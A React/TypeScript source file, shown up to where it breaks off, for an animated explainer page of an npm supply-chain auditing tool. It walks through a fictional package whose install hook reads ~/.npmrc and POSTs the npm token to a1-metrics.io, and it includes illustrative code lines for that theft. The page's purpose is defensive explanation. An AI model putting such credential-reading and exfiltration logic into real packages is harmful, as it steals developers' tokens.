/**
 * /how-it-works — the static explainer surface.
 *
 * Answers one question for someone who has never seen the product: what does
 * NpmGuard mean when it calls a package DANGEROUS, and why should you believe
 * it? The answer is shown rather than described — one package is followed the
 * whole way down, and each step of the pipeline performs itself.
 *
 * Pure static content; no engine calls, no store reads. Owns
 * src/styles/how-it-works.css (`.hiw-…`).
 *
 * MOTION — two rules, both load-bearing.
 *
 * 1. Nothing is ever pinned and the scroll is never hijacked. Scroll position
 *    drives *progress* on exactly two continuous elements (the rail fill and
 *    its pod) and *triggers* everything else. The page scrolls at whatever
 *    speed the reader wants, in either direction, at any moment.
 * 2. Every animated visual reads correctly as a still image. Under
 *    prefers-reduced-motion the whole motion layer short-circuits: each element
 *    is set to its finished state and not one ScrollTrigger is created.
 *
 * `.page` is the scroll container, not the window (base.css gives it
 * `overflow-y: auto` inside a full-height flex column), so every trigger has to
 * name it as its `scroller` — the default would watch the window, which never
 * scrolls here, and nothing would ever fire.
 *
 * This route is lazy-loaded in App.tsx: GSAP plus three plugins is the heaviest
 * thing on any static surface and does not belong in the boot chunk.
 */

import { useEffect, useRef } from "react";
import { Link } from "react-router";
import gsap from "gsap";
import { ScrollTrigger } from "gsap/ScrollTrigger";
import { DrawSVGPlugin } from "gsap/DrawSVGPlugin";
import { SplitText } from "gsap/SplitText";

gsap.registerPlugin(ScrollTrigger, DrawSVGPlugin, SplitText);

const CANARY = "CANARY_f8e2d91a";
const PITCH = "Formats strings with ANSI colour codes.";
const COMMAND = "npx npmguard-cli install left-pad-utils";

/** The six recorded events of the hero audit. Three of them are what the judge
 *  had to point at; an accusation with no pointer into the record is not an
 *  accusation, and the animation says so by lighting exactly those three. */
const HERO_EVENTS: { id: string; tag: string; what: string; cited?: boolean }[] = [
  { id: "e1", tag: "node", what: 'require "fs"' },
  { id: "e2", tag: "node", what: "read ~/.npmrc", cited: true },
  { id: "e3", tag: "net", what: "dns a1-metrics.io" },
  { id: "e4", tag: "sys", what: "connect :443" },
  { id: "e5", tag: "net", what: "POST a1-metrics.io/collect", cited: true },
  { id: "e6", tag: "net", what: "body carries the planted token", cited: true },
];

const HERO_STEPS = [
  { label: "Package", body: <>chalk-utils@1.4.2</> },
  { label: "Says it does", body: <>Prints coloured text in a terminal.</> },
  {
    label: "Accusation",
    body: (
      <>
        On install, <em>scripts/setup.js</em> reads your npm token and sends it off-box.
      </>
    ),
  },
  {
    label: "Trap",
    body: <>Plant a fake token · fake the server it calls · run the install hook</>,
  },
];

export function HowItWorks() {
  const root = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const el = root.current;
    if (!el) return;

    // base.css scrolls `.page`, not the window.
    const scroller = (el.closest(".page") as HTMLElement | null) ?? undefined;
    const q = gsap.utils.selector(el);
    const reduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    // gsap.context scopes every selector to this subtree AND records every
    // animation and trigger it creates, so revert() on unmount is complete —
    // a leaked ScrollTrigger would keep measuring a detached element forever.
    const ctx = gsap.context(() => {
      if (reduced) {
        q("[data-ev][data-cited]").forEach((n) => n.classList.add("is-cited"));
        gsap.set("[data-stamp]", { borderWidth: 2 });
        gsap.set("[data-rail-fill]", { scaleY: 1 });
        gsap.set("[data-rail-pod]", { top: "100%" });
        gsap.set("[data-hl]", { scaleX: 1 });
        gsap.set("[data-token]", { opacity: 0 });
        const type = q("[data-typeline]")[0];
        if (type) type.prepend(document.createTextNode(PITCH));
        const cmd = q("[data-cmd]")[0];
        if (cmd) cmd.textContent = COMMAND;
        q(".hiw-caret").forEach((c) => c.remove());
        q("[data-fire]").forEach((f) => f.classList.add("is-fired"));
        return;
      }

      const st = (extra: object) => ({ scroller, ...extra });

      /* Split each heading into lines and let them rise out of their own clip. */
      q("[data-split]").forEach((h) => {
        const outer = new SplitText(h, { type: "lines", linesClass: "hiw-splitline" });
        const inner = new SplitText(outer.lines, { type: "lines" });
        gsap.from(inner.lines, {
          yPercent: 108,
          duration: 0.72,
          ease: "power3.out",
          stagger: 0.075,
          scrollTrigger: st({ trigger: h, start: "top 88%", toggleActions: "play none none reverse" }),
        });
      });

      q("[data-fade]").forEach((n) => {
        gsap.from(n, {
          opacity: 0,
          y: 16,
          duration: 0.6,
          ease: "power2.out",
          scrollTrigger: st({ trigger: n, start: "top 92%", toggleActions: "play none none reverse" }),
        });
      });

      gsap.to(".hiw-cue span", {
        yPercent: 260,
        duration: 1.6,
        ease: "power1.inOut",
        repeat: -1,
        repeatDelay: 0.4,
      });

      /* ── Hero: one real audit, replayed ─────────────────────────────── */
      {
        const steps = q("[data-step]");
        const events = q("[data-ev]");
        const cited = events.filter((n) => n.hasAttribute("data-cited"));
        const stamp = q("[data-hero-stamp]")[0];

        const tape = gsap
          .timeline({ paused: true })
          .from(steps.slice(0, 5), { opacity: 0, y: 8, duration: 0.34, stagger: 0.42, ease: "power2.out" })
          .from(events, { opacity: 0, x: -6, duration: 0.22, stagger: 0.16, ease: "power2.out" }, "-=0.15")
          .add(() => cited.forEach((n) => n.classList.add("is-cited")), "+=0.25")
          .from(steps[5], { opacity: 0, y: 8, duration: 0.34, ease: "power2.out" }, "+=0.15")
          // Not a celebration: the border goes 1px → 2px and that is all. No
          // scale, no bounce — for either verdict (§2.9 rule 3).
          .fromTo(stamp, { borderWidth: 1 }, { borderWidth: 2, duration: 0.42, ease: "power1.inOut" }, "-=0.1");

        gsap.from(".hiw-exhibit", {
          opacity: 0,
          y: 24,
          duration: 0.7,
          ease: "power3.out",
          delay: 0.2,
          onComplete: () => tape.play(0),
        });
        q("[data-hero-replay]")[0]?.addEventListener("click", () => tape.play(0));
      }

      /* ── Act 1: the credential leaves the machine ───────────────────── */
      {
        const fig = q("[data-heist]")[0];
        const wire = q("[data-wire]")[0];
        const token = q("[data-token]")[0];
        const vertical = window.matchMedia("(max-width: 899px)").matches;

        gsap.set(token, { xPercent: -50, yPercent: -50, opacity: 0 });
        gsap.set("[data-got]", { opacity: 0 });

        gsap
          .timeline({
            scrollTrigger: st({ trigger: fig, start: "top 72%", toggleActions: "play none none reverse" }),
          })
          .from("[data-shell-line]", { opacity: 0, x: -8, duration: 0.3, stagger: 0.4, ease: "power2.out" })
          .to(
            "[data-target]",
            { scale: 1.06, duration: 0.18, yoyo: true, repeat: 3, ease: "power1.inOut", transformOrigin: "left center" },
            "+=0.1",
          )
          .to(token, { opacity: 1, duration: 0.2 }, "-=0.3")
          .to(token, {
            // Read on refresh, so a resize can never strand it mid-wire.
            x: () => (vertical ? 0 : wire.offsetWidth),
            y: () => (vertical ? wire.offsetHeight : 0),
            duration: 1.25,
            ease: "power1.inOut",
          })
          .to("[data-server]", { borderLeftColor: "var(--ng-danger)", duration: 0.3 }, "-=0.35")
          .to(token, { opacity: 0, scale: 0.9, duration: 0.25, ease: "power2.in" }, "-=0.1")
          .to("[data-got]", { opacity: 1, duration: 0.35, ease: "power2.out" }, "-=0.1");
      }

      /* ── Act 2: the rail, and six stations that perform their step ──── */
      {
        const rail = q("[data-rail]")[0];
        gsap.set("[data-rail-fill]", { scaleY: 0, transformOrigin: "top center" });

        // Scroll-LINKED, never scroll-locked: the rail fills as the section
        // passes, and that is the only thing scroll position drives.
        gsap
          .timeline({
            scrollTrigger: st({
              trigger: rail,
              start: "top 60%",
              end: "bottom 70%",
              scrub: 0.5,
              invalidateOnRefresh: true,
            }),
          })
          .to("[data-rail-fill]", { scaleY: 1, ease: "none" }, 0)
          .to("[data-rail-pod]", { top: "100%", ease: "none" }, 0);

        q("[data-station]").forEach((station) => {
          const viz = station.querySelector<HTMLElement>("[data-viz]");
          gsap.from([station.querySelector(".hiw-station__copy"), viz], {
            opacity: 0,
            y: 26,
            duration: 0.6,
            stagger: 0.1,
            ease: "power3.out",
            scrollTrigger: st({ trigger: station, start: "top 78%", toggleActions: "play none none reverse" }),
          });

          const kind = viz?.dataset.viz as keyof typeof STATIONS | undefined;
          if (!viz || !kind || !STATIONS[kind]) return;
          gsap
            .timeline({
              scrollTrigger: st({ trigger: viz, start: "top 72%", toggleActions: "play none none reverse" }),
            })
            .add(STATIONS[kind](viz));
        });
      }

      /* ── Act 3: fool one recorder, the other three keep writing ─────── */
      {
        const grid = q("[data-sgrid]")[0];
        const cards = q("[data-sensor]");
        const blind = q("[data-sensor-blind]")[0];
        const blindWave = blind.querySelector("[data-sensor-wave]");
        const liveWaves = cards
          .filter((c) => c !== blind)
          .map((c) => c.querySelector("[data-sensor-wave]"));

        gsap.set("[data-sensor-wave]", { drawSVG: "0%" });
        gsap.set("[data-sensor-flag]", { opacity: 0 });

        gsap.from(cards, {
          opacity: 0,
          y: 22,
          duration: 0.55,
          stagger: 0.08,
          ease: "power3.out",
          scrollTrigger: st({ trigger: grid, start: "top 82%", toggleActions: "play none none reverse" }),
        });

        // The four traces draw once on arrival, and FULLY DRAWN is the resting
        // state — a loop that parks at 0% leaves four blank cards for whoever
        // arrives mid-cycle, which is the opposite of what this section says.
        gsap.to("[data-sensor-wave]", {
          drawSVG: "100%",
          duration: 1.1,
          stagger: 0.1,
          ease: "none",
          scrollTrigger: st({ trigger: grid, start: "top 82%", once: true }),
        });

        gsap
          .timeline({
            repeat: -1,
            repeatDelay: 2.4,
            delay: 1.8,
            // Paused off-screen: an infinite loop nobody is looking at is pure
            // battery, and it also lets a screenshot settle.
            scrollTrigger: st({ trigger: grid, start: "top 78%", toggleActions: "play pause resume pause" }),
          })
          // One recorder gets patched out mid-run…
          .to(blindWave, { drawSVG: "100% 100%", duration: 0.5, ease: "power2.in" })
          .to("[data-sensor-flag]", { opacity: 1, duration: 0.3 }, "-=0.25")
          // …and the other three keep writing regardless.
          .fromTo(
            liveWaves,
            { drawSVG: "0% 0%" },
            { drawSVG: "0% 100%", duration: 0.9, stagger: 0.08, ease: "none" },
            "+=0.3",
          )
          .to(blindWave, { drawSVG: "0% 100%", duration: 0.6, ease: "power2.out" }, "+=0.6")
          .to("[data-sensor-flag]", { opacity: 0, duration: 0.3 }, "-=0.45");
      }

      /* ── Act 4: the verdicts land ───────────────────────────────────── */
      q("[data-vcard]").forEach((card, i) => {
        gsap
          .timeline({
            scrollTrigger: st({ trigger: card, start: "top 84%", toggleActions: "play none none reverse" }),
          })
          .from(card, { opacity: 0, y: 26, duration: 0.55, ease: "power3.out", delay: i * 0.09 })
          .fromTo(
            card.querySelector("[data-stamp]"),
            { borderWidth: 1 },
            { borderWidth: 2, duration: 0.42, ease: "power1.inOut" },
            "-=0.15",
          );
      });

      /* ── Act 5: back in your own terminal ───────────────────────────── */
      {
        const cmd = q("[data-cmd]")[0];
        const caret = q("[data-term-caret]")[0];
        const outs = q("[data-term-out]");
        const state = { i: 0 };

        gsap.set(outs, { opacity: 0 });

        const tl = gsap
          .timeline({ paused: true })
          .set(caret, { display: "inline-block" })
          .add(() => {
            cmd.textContent = "";
            state.i = 0;
          })
          .to(state, {
            i: COMMAND.length,
            duration: COMMAND.length * 0.032,
            ease: "none",
            onUpdate: () => {
              cmd.textContent = COMMAND.slice(0, Math.round(state.i));
            },
          })
          .set(caret, { display: "none" })
          .to(outs, { opacity: 1, duration: 0.24, stagger: 0.19, ease: "power2.out" }, "+=0.2");

        ScrollTrigger.create(
          st({ trigger: q("[data-term]")[0], start: "top 78%", once: true, onEnter: () => tl.play(0) }),
        );
        q("[data-term-replay]")[0]?.addEventListener("click", () => tl.play(0));
      }
    }, el);

    // Fonts settle after first paint and move every trigger position with them.
    void document.fonts?.ready.then(() => ScrollTrigger.refresh());

    return () => ctx.revert();
  }, []);

  return (
    <div className="hiw ng-root" ref={root}>
      {/* ═══════════════════ HERO ═══════════════════ */}
      <section className="hiw-hero">
        <div className="hiw-wrap hiw-hero__grid">
          <div>
            <p className="hiw-eyebrow" data-fade>
              npm supply-chain auditing
            </p>
            <h1 className="hiw-h1" data-split>
              We don&rsquo;t flag packages. We catch them.
            </h1>
            <p className="hiw-lead hiw-hero__lead" data-fade>
              An accusation written down in advance. A trap built to provoke exactly that. A
              recording that has to back it up.
            </p>
            <div className="hiw-hero__cta" data-fade>
              <a className="hiw-btn hiw-btn--primary" href="#hiw-line">
                Watch one get caught
              </a>
              <a className="hiw-btn" href="#hiw-verdict">
                What the verdicts mean
              </a>
            </div>
          </div>

          <figure className="hiw-exhibit">
            <figcaption className="hiw-exhibit__bar">
              <span className="hiw-dot" aria-hidden="true" />
              audit · chalk-utils@1.4.2
              <button type="button" className="hiw-replay" data-hero-replay>
                replay ↻
              </button>
            </figcaption>
            <div className="hiw-exhibit__body">
              {HERO_STEPS.map((step, i) => (
                <div className="hiw-step" data-step key={step.label}>
                  <span className="hiw-step__n">{String(i + 1).padStart(2, "0")}</span>
                  <div>
                    <div className="hiw-step__label">{step.label}</div>
                    <div className="hiw-step__val">{step.body}</div>
                  </div>
                </div>
              ))}

              <div className="hiw-step" data-step>
                <span className="hiw-step__n">05</span>
                <div>
                  <div className="hiw-step__label">Recording</div>
                  <div className="hiw-evlist">
                    {HERO_EVENTS.map((ev) => (
                      <div
                        className="hiw-ev"
                        data-ev
                        data-cited={ev.cited ? "" : undefined}
                        key={ev.id}
                      >
                        <span className="hiw-ev__id">{ev.id}</span>
                        <span className="hiw-ev__tag">{ev.tag}</span>
                        <span>{ev.what}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="hiw-step" data-step>
                <span className="hiw-step__n">06</span>
                <div>
                  <div className="hiw-step__label">Verdict</div>
                  <div className="hiw-step__val hiw-step__val--verdict">
                    <span className="hiw-stamp hiw-stamp--danger" data-stamp data-hero-stamp>
                      Dangerous
                    </span>
                    <span className="hiw-step__cited">
                      cited <span className="hiw-cite">e2 e5 e6</span>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </figure>
        </div>
        <div className="hiw-cue" aria-hidden="true">
          <span />
        </div>
      </section>

      {/* ═══════════════════ ACT 1 — THE THEFT ═══════════════════ */}
      <section className="hiw-act hiw-act--dark">
        <div className="hiw-wrap">
          <p className="hiw-eyebrow" data-fade>
            what you are actually installing
          </p>
          <h2 className="hiw-h2" data-split>
            One command. Their code, running.
          </h2>

          <div className="hiw-heist" data-heist>
            <div className="hiw-box">
              <div className="hiw-box__title">your machine</div>
              <pre className="hiw-shell">
                <code>
                  <span className="hiw-line">
                    <span className="hiw-prompt">$</span> npm install chalk-utils
                  </span>
                  <span className="hiw-line" data-shell-line>
                    added 1 package in 0.9s
                  </span>
                  <span className="hiw-line hiw-line--hook" data-shell-line>
                    &gt; postinstall: node scripts/setup.js
                  </span>
                </code>
              </pre>
              <div className="hiw-files">
                <span className="hiw-filechip">~/.ssh</span>
                <span className="hiw-filechip">.env</span>
                <span className="hiw-filechip hiw-filechip--hot" data-target>
                  ~/.npmrc
                </span>
              </div>
            </div>

            <div className="hiw-wire" data-wire>
              <svg viewBox="0 0 200 40" preserveAspectRatio="none" aria-hidden="true">
                <path
                  d="M0 20 H200"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeDasharray="4 4"
                />
              </svg>
              <span className="hiw-token" data-token>
                npm_tok_9f2c…
              </span>
            </div>

            <div className="hiw-box hiw-box--them" data-server>
              <div className="hiw-box__title">a1-metrics.io</div>
              <div className="hiw-catch">
                <span className="hiw-got">POST /collect</span>
                <span className="hiw-got hiw-got--body" data-got>
                  npm_tok_9f2c…
                </span>
              </div>
            </div>
          </div>

          <p className="hiw-note" data-fade>
            Nothing was imported. Nothing was called. The install ran it.
          </p>
        </div>
      </section>

      {/* ═══════════════════ ACT 2 — THE LINE ═══════════════════ */}
      <section className="hiw-act" id="hiw-line">
        <div className="hiw-wrap">
          <p className="hiw-eyebrow" data-fade>
            how we catch it
          </p>
          <h2 className="hiw-h2" data-split>
            Six moves, and a recording at the end.
          </h2>
          <p className="hiw-sub" data-fade>
            Following one package: <span className="hiw-mono">chalk-utils</span>, which claims to
            colour terminal text.
          </p>
        </div>

        <div className="hiw-wrap">
          <div className="hiw-rail" data-rail>
            <div className="hiw-spine" aria-hidden="true">
              <span className="hiw-spine__track" />
              <span className="hiw-spine__fill" data-rail-fill />
              <span className="hiw-pod" data-rail-pod>
                ▣
              </span>
            </div>

            <Station n="01" title="Take it apart" body="The exact tarball the registry would hand you, unpacked somewhere harmless.">
              <div className="hiw-station__viz" data-viz="unpack">
                <div className="hiw-tgz" data-u-tgz>
                  <span aria-hidden="true">▣</span> chalk-utils-1.4.2.tgz
                </div>
                <div className="hiw-filelist">
                  <div className="hiw-filerow" data-u-file>
                    <span className="hiw-filerow__name">index.js</span>
                    <span className="hiw-chip">runtime</span>
                  </div>
                  <div className="hiw-filerow" data-u-file>
                    <span className="hiw-filerow__name">scripts/setup.js</span>
                    <span className="hiw-chip hiw-chip--warn" data-u-hot>
                      runs on install
                    </span>
                  </div>
                  <div className="hiw-filerow" data-u-file>
                    <span className="hiw-filerow__name">README.md</span>
                    <span className="hiw-chip">doc</span>
                  </div>
                </div>
              </div>
            </Station>

            <Station n="02" title="Ask what it’s for" body="Its own pitch, in one sentence. Everything after this is measured against it.">
              <div className="hiw-station__viz" data-viz="pitch">
                <div className="hiw-pbox" data-p-in>
                  <div className="hiw-pbox__k">README.md</div>
                  <p>
                    “tiny helpers for colouring terminal output. no dependencies, no build step.”
                  </p>
                </div>
                <div className="hiw-pbox hiw-pbox--out" data-p-out>
                  <div className="hiw-pbox__k">what it is for</div>
                  <p className="hiw-typeline" data-typeline>
                    <span className="hiw-caret" aria-hidden="true" />
                  </p>
                  <div className="hiw-chiprow" data-p-chip>
                    <span className="hiw-chip hiw-chip--ok">powers this justifies: none</span>
                  </div>
                </div>
              </div>
            </Station>

            <Station n="03" title="Find the lie" body="Every file, read against that pitch. The output is line numbers, not a score.">
              <div className="hiw-station__viz" data-viz="suspect">
                <div className="hiw-code">
                  <span className="hiw-scan" data-scan aria-hidden="true" />
                  <CodeLine n="12" src="const os = require('os')" />
                  <CodeLine n="13" src="const fs = require('fs')" />
                  <CodeLine n="14" src="const rc = fs.readFileSync(" hot />
                  <CodeLine n="15" src="  os.homedir() + '/.npmrc')" hot />
                  <CodeLine n="16" src="https.request(host, 'POST', rc)" hot />
                </div>
                <p className="hiw-cap" data-s-cap>
                  <span className="hiw-cap__tag">setup.js:14–16</span>a string library, reading your
                  auth token
                </p>
              </div>
            </Station>

            <Station n="04" title="Set the trap" body="Plant a credential nobody else has. Fake the server it wants. Then pull the trigger — once.">
              <div className="hiw-station__viz" data-viz="trap">
                <div className="hiw-bench">
                  <div className="hiw-bench__row" data-t-row>
                    <span className="hiw-bench__k">plant</span>
                    <span>
                      ~/.npmrc = <span className="hiw-canary">{CANARY}</span>
                    </span>
                  </div>
                  <div className="hiw-bench__row" data-t-row>
                    <span className="hiw-bench__k">fake</span>
                    <span>a1-metrics.io → 200 ok</span>
                  </div>
                  <div className="hiw-bench__row" data-t-row>
                    <span className="hiw-bench__k">freeze</span>
                    <span>the clock</span>
                  </div>
                </div>
                <span className="hiw-fire" data-fire aria-hidden="true">
                  trigger › scripts/setup.js
                </span>
              </div>
            </Station>

            <Station n="05" title="Let it try" body="It runs for real, in a throwaway container, with four recorders watching at once.">
              <div className="hiw-station__viz" data-viz="run">
                <div className="hiw-scope">
                  <div className="hiw-scope__bar">
                    <span>sandbox</span>
                    <span className="hiw-live" data-r-live>
                      recording
                    </span>
                  </div>
                  <svg viewBox="0 0 300 120" preserveAspectRatio="none" aria-hidden="true">
                    <path
                      className="hiw-wave"
                      data-r-wave
                      d="M0 18 H60 l6 -9 l6 18 l6 -9 H130 l5 -12 l5 24 l5 -12 H300"
                    />
                    <path
                      className="hiw-wave"
                      data-r-wave
                      d="M0 48 H100 l6 -10 l6 20 l6 -10 H180 l6 -14 l6 28 l6 -14 H300"
                    />
                    <path className="hiw-wave" data-r-wave d="M0 78 H150 l7 -8 l7 16 l7 -8 H300" />
                    <path
                      className="hiw-wave"
                      data-r-wave
                      d="M0 108 H40 l5 -12 l5 24 l5 -12 H120 l6 -9 l6 18 l6 -9 H300"
                    />
                  </svg>
                  <div className="hiw-scope__keys">
                    <span>syscalls</span>
                    <span>network</span>
                    <span>files</span>
                    <span>node</span>
                  </div>
                </div>
              </div>
            </Station>

            <Station n="06" title="Make it prove it" body="A ruling with no pointer into the recording is not a ruling. It gets thrown out.">
              <div className="hiw-station__viz" data-viz="judge">
                <div className="hiw-jcard hiw-jcard--bad" data-j-bad>
                  “This is clearly malicious behaviour.”
                  <span className="hiw-jcard__k">thrown out — cites nothing</span>
                </div>
                <div className="hiw-jcard" data-j-good>
                  “The planted token was read from <span className="hiw-mono">~/.npmrc</span> and
                  POSTed to a host unrelated to terminal styling.”
                  <div className="hiw-jcard__foot">
                    <span className="hiw-stamp hiw-stamp--danger" data-stamp data-j-stamp>
                      Dangerous
                    </span>
                    <span className="hiw-cites">
                      {["e2", "e5", "e6"].map((id) => (
                        <span className="hiw-chip hiw-chip--info" data-j-cite key={id}>
                          {id}
                        </span>
                      ))}
                    </span>
                  </div>
                </div>
              </div>
            </Station>
          </div>
        </div>

        <div className="hiw-wrap">
          <div className="hiw-offramps">
            <article className="hiw-offramp" data-fade>
              <span className="hiw-offramp__k">it can end at 01</span>
              <p>
                Some packages pipe a script off the internet into a shell, or run an install hook
                for a file they never shipped. What executes isn&rsquo;t in the package, so reading
                the package proves nothing. Dangerous on its face.
              </p>
            </article>
            <article className="hiw-offramp" data-fade>
              <span className="hiw-offramp__k">it can end at 03</span>
              <p>
                No file produced an accusation, so there is nothing to test. The sandbox never
                starts. That is the ordinary outcome for almost everything.
              </p>
            </article>
          </div>
        </div>
      </section>

      {/* ═══════════════════ ACT 3 — THE RECORDERS ═══════════════════ */}
      <section className="hiw-act hiw-act--dark">
        <div className="hiw-wrap">
          <p className="hiw-eyebrow" data-fade>
            the recorders
          </p>
          <h2 className="hiw-h2" data-split>
            Fool one. The other three still see you.
          </h2>

          <div className="hiw-sgrid" data-sgrid>
            <Sensor k="the kernel" d="M0 30 H24 l4 -14 l4 22 l4 -14 H60 l5 -10 l5 18 l5 -10 H120">
              Every request it makes of the operating system.
            </Sensor>
            <Sensor
              k="the runtime"
              d="M0 22 H30 l4 -12 l4 20 l4 -12 H70 l5 -8 l5 14 l5 -8 H120"
              blind
            >
              Inside the JavaScript engine — and it can be patched out.
            </Sensor>
            <Sensor k="the wire" d="M0 26 H40 l4 -16 l4 26 l4 -16 H84 l4 -10 l4 18 l4 -10 H120">
              Raw packets leaving the box, whatever the code claims.
            </Sensor>
            <Sensor k="the disk" d="M0 32 H50 l5 -18 l5 26 l5 -18 H120">
              A before-and-after photograph of the filesystem.
            </Sensor>
          </div>

          <p className="hiw-note" data-fade>
            And if the recorders go quiet, that is not an acquittal — it is recorded as{" "}
            <em>“we did not observe this”</em>.
          </p>
        </div>
      </section>

      {/* ═══════════════════ ACT 4 — THE VERDICT ═══════════════════ */}
      <section className="hiw-act" id="hiw-verdict">
        <div className="hiw-wrap">
          <p className="hiw-eyebrow" data-fade>
            the outcome
          </p>
          <h2 className="hiw-h2" data-split>
            Two verdicts. And one refusal to give one.
          </h2>

          <div className="hiw-vgrid">
            <article className="hiw-vcard hiw-vcard--danger" data-vcard>
              <span className="hiw-stamp hiw-stamp--danger" data-stamp>
                Dangerous
              </span>
              <h3>We saw it happen.</h3>
              <p>
                Accused in advance, provoked on purpose, confirmed against numbered lines of the
                recording.
              </p>
              <span className="hiw-vcard__k">
                backed by a stored, content-hashed run you can replay
              </span>
            </article>
            <article className="hiw-vcard hiw-vcard--safe" data-vcard>
              <span className="hiw-stamp hiw-stamp--safe" data-stamp>
                Safe
              </span>
              <h3>Nothing we could confirm.</h3>
              <p>
                Either nothing was accused, or everything accused ran to completion with all four
                recorders intact — and did not happen.
              </p>
              <span className="hiw-vcard__k">always shipped beside its coverage counts</span>
            </article>
            <article className="hiw-vcard hiw-vcard--error" data-vcard>
              <span className="hiw-stamp hiw-stamp--error" data-stamp>
                Could not conclude
              </span>
              <h3>We tried, and failed.</h3>
              <p>
                A recorder failed, or the run was cut short. There is no report, and you are invited
                to retry.
              </p>
              <span className="hiw-vcard__k">never quietly rounded down to “safe”</span>
            </article>
          </div>

          <blockquote className="hiw-quote" data-split>
            “Safe” never means this package is safe. It means this audit found nothing it could
            prove.
          </blockquote>
        </div>
      </section>

      {/* ═══════════════════ ACT 5 — BACK TO YOU ═══════════════════ */}
      <section className="hiw-act hiw-act--cta">
        <div className="hiw-wrap">
          <p className="hiw-eyebrow" data-fade>
            try it
          </p>
          <h2 className="hiw-h2" data-split>
            Put the verdict in front of the install.
          </h2>

          <div className="hiw-term" data-term>
            <div className="hiw-term__bar">
              <span className="hiw-dot" aria-hidden="true" />
              <span>zsh</span>
              <button type="button" className="hiw-replay" data-term-replay>
                replay ↻
              </button>
            </div>
            <pre className="hiw-term__body">
              <code>
                <span className="hiw-line hiw-line--cmd">
                  <span className="hiw-prompt">$</span> <span data-cmd />
                  <span className="hiw-caret" data-term-caret aria-hidden="true" />
                </span>
                <span className="hiw-line" data-term-out>
                  {"  looking up left-pad-utils@2.0.1 …"}
                </span>
                <span className="hiw-line" data-term-out>
                  {"  audit found · concluded 3 days ago"}
                </span>
                <span className="hiw-line hiw-line--bad" data-term-out>
                  {"  DANGEROUS   reads ~/.npmrc on install, POSTs it to a1-metrics.io"}
                </span>
                <span className="hiw-line" data-term-out>
                  {"              proof: 3 cited events in run_3c9a… · npmguard replay run_3c9a"}
                </span>
                <span className="hiw-line" data-term-out>
                  {"  install blocked. re-run with --force to override."}
                </span>
              </code>
            </pre>
          </div>

          <div className="hiw-cta" data-fade>
            <code className="hiw-cta__cmd">
              <span className="hiw-prompt">$</span> npx npmguard-cli install express
            </code>
            <Link className="hiw-btn" to="/cli">
              Get the CLI
            </Link>
          </div>
        </div>
      </section>
    </div>
  );
}

/* ---------------------------------------------------------------------------
   Small presentational pieces. They exist to keep the six stations readable in
   source, not because anything reuses them elsewhere.
   --------------------------------------------------------------------------- */

function Station({
  n,
  title,
  body,
  children,
}: {
  n: string;
  title: string;
  body: string;
  children: React.ReactNode;
}) {
  return (
    <article className="hiw-station" data-station>
      <div className="hiw-station__copy">
        <p className="hiw-station__n">{n}</p>
        <h3>{title}</h3>
        <p>{body}</p>
      </div>
      {children}
    </article>
  );
}

function CodeLine({ n, src, hot }: { n: string; src: string; hot?: boolean }) {
  return (
    <div className={hot ? "hiw-codeline hiw-codeline--hot" : "hiw-codeline"}>
      {hot ? <span className="hiw-hl" data-hl aria-hidden="true" /> : null}
      <span className="hiw-codeline__n">{n}</span>
      <span>{src}</span>
    </div>
  );
}

function Sensor({
  k,
  d,
  blind,
  children,
}: {
  k: string;
  d: string;
  blind?: boolean;
  children: React.ReactNode;
}) {
  return (
    <article
      className={blind ? "hiw-sensor hiw-sensor--blind" : "hiw-sensor"}
      data-sensor
      data-sensor-blind={blind ? "" : undefined}
    >
      <span className="hiw-sensor__k">{k}</span>
      <svg viewBox="0 0 120 40" preserveAspectRatio="none" aria-hidden="true">
        <path className="hiw-wave" data-sensor-wave d={d} />
      </svg>
      <p>{children}</p>
      {blind ? (
        <span className="hiw-sensor__flag" data-sensor-flag>
          evaded
        </span>
      ) : null}
    </article>
  );
}

/* The six station performances. Each is built against its own subtree so the
   selectors cannot reach a sibling station's identical markup. */
const STATIONS: Record<string, (viz: HTMLElement) => gsap.core.Timeline> = {
  /* 01 — a tarball comes apart into files. */
  unpack: (viz) => {
    const s = gsap.utils.selector(viz);
    return gsap
      .timeline()
      .from(s("[data-u-tgz]"), { opacity: 0, scale: 0.9, duration: 0.4, ease: "back.out(2)" })
      .from(s("[data-u-file]"), { opacity: 0, y: -18, duration: 0.42, stagger: 0.13, ease: "power3.out" }, "-=0.05")
      // The one that runs whether you ever use the package or not.
      .from(s("[data-u-hot]"), { scale: 0.8, duration: 0.34, ease: "back.out(3)" }, "-=0.2")
      .to(s("[data-u-hot]"), {
        boxShadow: "0 0 0 4px color-mix(in srgb, var(--ng-danger) 22%, transparent)",
        duration: 0.3,
        yoyo: true,
        repeat: 3,
        ease: "power1.inOut",
      });
  },

  /* 02 — the README becomes one sentence, typed out. */
  pitch: (viz) => {
    const s = gsap.utils.selector(viz);
    const line = s("[data-typeline]")[0];
    const node = document.createTextNode("");
    line.prepend(node);
    const state = { i: 0 };

    return gsap
      .timeline()
      .from(s("[data-p-in]"), { opacity: 0, y: 12, duration: 0.45, ease: "power2.out" })
      .from(s("[data-p-out]"), { opacity: 0, y: 12, duration: 0.45, ease: "power2.out" }, "+=0.15")
      .to(
        state,
        {
          i: PITCH.length,
          duration: PITCH.length * 0.024,
          ease: "none",
          onUpdate: () => {
            node.nodeValue = PITCH.slice(0, Math.round(state.i));
          },
        },
        "-=0.1",
      )
      .from(s("[data-p-chip]"), { opacity: 0, y: -6, duration: 0.35, ease: "power2.out" }, "+=0.25")
      .set(s(".hiw-caret"), { display: "none" }, "+=0.6");
  },

  /* 03 — a read head passes over the file; the guilty lines stay lit. */
  suspect: (viz) => {
    const s = gsap.utils.selector(viz);
    const block = s(".hiw-code")[0];
    gsap.set(s("[data-hl]"), { scaleX: 0 });
    gsap.set(s("[data-scan]"), { opacity: 0, y: 0 });
    gsap.set(s("[data-s-cap]"), { opacity: 0 });

    return gsap
      .timeline()
      .to(s("[data-scan]"), { opacity: 1, duration: 0.16 })
      .to(s("[data-scan]"), { y: () => block.offsetHeight, duration: 1.35, ease: "none" })
      .to(s("[data-scan]"), { opacity: 0, duration: 0.2 }, "-=0.2")
      .to(s("[data-hl]"), { scaleX: 1, duration: 0.42, stagger: 0.09, ease: "power2.out" }, "-=0.55")
      .to(s("[data-s-cap]"), { opacity: 1, duration: 0.35, ease: "power2.out" }, "-=0.15");
  },

